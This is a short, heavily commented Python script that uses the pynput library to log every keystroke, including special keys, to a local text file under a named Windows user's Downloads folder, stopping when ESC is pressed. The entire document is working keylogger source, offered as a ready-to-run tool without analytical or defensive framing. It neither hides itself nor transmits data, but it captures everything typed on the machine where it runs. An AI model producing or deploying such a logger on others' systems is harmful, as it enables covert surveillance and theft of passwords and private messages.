# Import the necessary module from pynput to listen to keyboard events
from pynput import keyboard  

# Define the log file location (change this to a directory with write permissions)
log_file = r"C:\Users\KIIT0001\Downloads\keylogger.txt"  # Modify the path if needed

# Function to handle key press events
def on_press(key):
    try:
        # Open the file in append mode to store logged keys
        with open(log_file, "a") as file:
            file.write(f"{key.char}")  # Write the character of the key pressed
    except AttributeError:
        # If key.char is not available (like for special keys), record the full key name
        with open(log_file, "a") as file:
            file.write(f" {key} ")  # Logs special keys like Enter, Shift, etc.

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:  # If the ESC key is pressed, stop the keylogger
        return False  # This will stop the listener and end the script

# Create a listener to capture keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Keep the listener running until ESC is pressed
